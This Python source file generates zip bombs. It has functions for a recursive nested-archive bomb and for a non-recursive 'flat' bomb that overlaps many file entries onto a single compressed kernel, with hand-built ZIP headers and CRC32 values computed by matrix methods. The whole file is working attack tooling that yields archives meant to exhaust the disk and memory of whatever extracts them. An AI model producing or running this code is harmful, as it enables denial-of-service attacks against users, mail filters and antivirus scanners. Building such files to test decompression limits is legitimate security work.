import io
import zipfile
import zlib
import struct
import misc.pt_math

#Basic Recusive zipbomb
def write_base_dummy(size_MB):
    """Writes in memory dummy file of specified size"""
    mem_buff = io.BytesIO()

    with zipfile.ZipFile(mem_buff,"w",compression=zipfile.ZIP_DEFLATED) as zf:

        dummy_data = b"0"*size_MB*1024*1024
        zf.writestr("dummy.txt",dummy_data)

    compressed_dummy = mem_buff.getvalue()
    mem_buff.close()

    return compressed_dummy

def write_layer(compressed_file, file_count):
    """Writes one layer of compressed files of specified count"""
    mem_buff = io.BytesIO()

    with zipfile.ZipFile(mem_buff,"w",compression=zipfile.ZIP_DEFLATED) as zf:
        
        for i in range(file_count):

            zf.writestr("layer{}.zip".format(i),compressed_file)

    compressed_layer = mem_buff.getvalue()
    mem_buff.close()

    return compressed_layer

def make_recurssive_bomb(dummy_size,file_count,layer_count):
    """Main function for creating recursive zipbomb"""
    layer = write_base_dummy(dummy_size)
    for i in range(layer_count):
        layer = write_layer(layer,file_count)
    return layer

##########################################################
#############Flatbomb Functions and Logic#################
##########################################################

def create_stored_deflate_block(data: bytes, is_final_stream_block: bool = False) -> bytes:
    """
    Wraps raw bytes into Deflate non-compressed (Stored) blocks (BTYPE=00).
    Automatically chunks data into 65,535-byte limits, 
    altough this limit is never exceeded it is still good feature.
    """
    out = bytearray()
    
    if not data:
        header = 1 if is_final_stream_block else 0
        out.append(header)
        out.extend(struct.pack('<HH', 0, 0xFFFF))
        return bytes(out)

    offset = 0
    while offset < len(data):
        # Extract a chunk of max 65,535 bytes
        chunk = data[offset : offset + 65535]
        offset += len(chunk)
        
        is_last_chunk = (offset >= len(data))
        bfinal = 1 if (is_final_stream_block and is_last_chunk) else 0
        out.append(bfinal)
        
        length = len(chunk)
        nlength = (~length) & 0xFFFF
        
        out.extend(struct.pack('<HH', length, nlength))
        out.extend(chunk)
        
    return bytes(out)

def pack_local_file_header(filename_bytes, crc32, comp_size, uncomp_size):
    """Struct formating local file header into its byte form"""
    
    signature = 0x04034b50
    version = 20           # 2.0 (needed for Deflate)
    flags = 0              # No special flags
    method = 8             # 8 = Deflate
    mod_time = 0           # MS-DOS time (0 for simplicity)
    mod_date = 0           # MS-DOS date (0 for simplicity)
    extra_len = 0          # No extra fields
    
    header = struct.pack(
        '<IHHHHHIIIHH',
        signature,
        version,
        flags,
        method,
        mod_time,
        mod_date,
        crc32,
        comp_size,
        uncomp_size,
        len(filename_bytes),
        extra_len
    )
    return header + filename_bytes


def pack_central_directory_header(filename_bytes, crc32, comp_size, uncomp_size, local_header_offset):
    """Function formating central directory header into its byte form"""
    
    signature = 0x02014b50
    version_made_by = 20   
    version_needed = 20
    flags = 0
    method = 8
    mod_time = 0
    mod_date = 0
    extra_len = 0
    comment_len = 0
    disk_start = 0
    int_attrs = 0
    ext_attrs = 0          # 0 is safe, or 0x81B40000 for standard Unix file permissions
    
    header = struct.pack(
        '<IHHHHHHIIIHHHHHII',
        signature,
        version_made_by,
        version_needed,
        flags,
        method,
        mod_time,
        mod_date,
        crc32,
        comp_size,
        uncomp_size,
        len(filename_bytes),
        extra_len,
        comment_len,
        disk_start,
        int_attrs,
        ext_attrs,
        local_header_offset # The exact byte position where this file's Local Header starts in the ZIP
    )
    return header + filename_bytes


def pack_eocd(num_files, central_dir_size, central_dir_offset):
    """Function defining end of central directory into its byte form"""
    
    signature = 0x06054b50
    disk_num = 0
    cd_disk = 0
    
    header = struct.pack(
        '<IHHHHIIH',
        signature,
        disk_num,
        cd_disk,
        num_files,           # Total number of entries in the central directory on this disk
        num_files,           # Total number of entries in the central directory
        central_dir_size,    # Total byte size of all Central Directory Headers combined
        central_dir_offset,  # The exact byte position where the first Central Directory Header starts
        0                    # ZIP comment length (0)
    )
    return header

def build_kernel(data):
    """Function for getting raw DEFLATE stream without any other encapsulation"""
    wbits = -zlib.MAX_WBITS
    
    compressor = zlib.compressobj(
        level=zlib.Z_DEFAULT_COMPRESSION,
        method=zlib.DEFLATED,
        wbits=wbits
    )
    raw_deflated = compressor.compress(data) + compressor.flush()
    return raw_deflated

def generate_unique_names(count):
    """Function for generating unique names for 'fake' files"""
    chars = b"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    names = []

    for i in range(count):
        name = bytearray(4) # Create a 4-byte empty array
        for j in range(3, -1, -1): # Fill it backwards
            name[j] = chars[i % 36]
            i //= 36
        
        names.append(bytes(name))
    return names

def calculate_curr_crc(prev_matrix,prev_lfh_bytes):
    """CRC32 claculation method using matrix optimalization"""
    Mx = misc.pt_math.build_data_matrix(prev_lfh_bytes)
    M_file = misc.pt_math.gf2_matmul(prev_matrix, Mx)
    crc = misc.pt_math.get_final_crc(M_file)
    return crc,M_file


def build_flat_bomb(f_count,decomp_kernel_size_MB):
    """Main function for orchestrating the construction of flatbomb"""
    binary_blocks = []
    cdh_metadata = []

    if(f_count+1 > 0xFFFF): #standard zip specification limit of 65,535 files per archive
        raise ValueError(f"Archive file count ({f_count}) exceeds 65,535 limit.")
    if(decomp_kernel_size_MB*1024*1024 > 0xFFFFFFFF):
        raise ValueError("Exceeded maximum treshold for uncompressed data at 4,294,967,295B")

    uniq_names = generate_unique_names(f_count)

    data = b"a"*1024*1024*decomp_kernel_size_MB
    raw_deflated = build_kernel(data)
    kernel_matrix = misc.pt_math.build_kernel_matrix(decomp_kernel_size_MB)
    kernel_crc = misc.pt_math.get_final_crc(kernel_matrix)

    lfh_k_bytes = pack_local_file_header(b"THEKRNL", kernel_crc, len(raw_deflated), len(data))
    full_k_block = lfh_k_bytes + raw_deflated

    binary_blocks.insert(0, full_k_block)

    cdh_metadata.insert(0, {
            "filename": b"THEKRNL",
            "crc": kernel_crc,
            "comp_size": len(raw_deflated),
            "uncomp_size": len(data),
            "block_size": len(full_k_block) # We track size to calculate offsets later
    })

    file_matrix = kernel_matrix
    lfh_bytes = lfh_k_bytes
    len_comp = len(lfh_k_bytes)+len(raw_deflated) + 5
    len_uncomp = len(lfh_k_bytes)+len(data)
    for i in range(f_count):

        name = uniq_names[i]
        crc,file_matrix = calculate_curr_crc(file_matrix,lfh_bytes)
        curr_lfh_bytes = pack_local_file_header(name,crc,len_comp,len_uncomp)

        binary_blocks.append(curr_lfh_bytes)

        cdh_metadata.append({
            "filename": name,
            "crc": crc,
            "comp_size": len_comp,
            "uncomp_size": len_uncomp,
            "block_size": len(curr_lfh_bytes)+5 # We track size to calculate offsets later +5 is here just because its easier to keep track of it
        })

        lfh_bytes = curr_lfh_bytes
        len_comp += 5 + len(lfh_bytes)
        len_uncomp += len(lfh_bytes)

    binary_blocks.reverse()
    cdh_metadata.reverse()

    zip_buff = io.BytesIO()

    # PHASE 2: Write the physical data and resolve absolute offsets

    zip_buff.write(binary_blocks[0])
    for i in range(1,len(binary_blocks)-1):
        zip_buff.write(create_stored_deflate_block(binary_blocks[i]))
    zip_buff.write(create_stored_deflate_block(lfh_k_bytes))
    zip_buff.write(raw_deflated)

    central_dir_offset = zip_buff.tell()
    
    current_offset = 0
    for meta in cdh_metadata:
        zip_buff.write(pack_central_directory_header(
            meta["filename"], 
            meta["crc"], 
            meta["comp_size"], 
            meta["uncomp_size"], 
            current_offset
        ))
        # The offset for the next file is shifted by the exact byte size of the current block
        current_offset += meta["block_size"]

    # PHASE 3: Write End of Central Directory

    central_dir_size = zip_buff.tell() - central_dir_offset
    zip_buff.write(pack_eocd(len(cdh_metadata), central_dir_size, central_dir_offset))
    
    return zip_buff.getvalue()
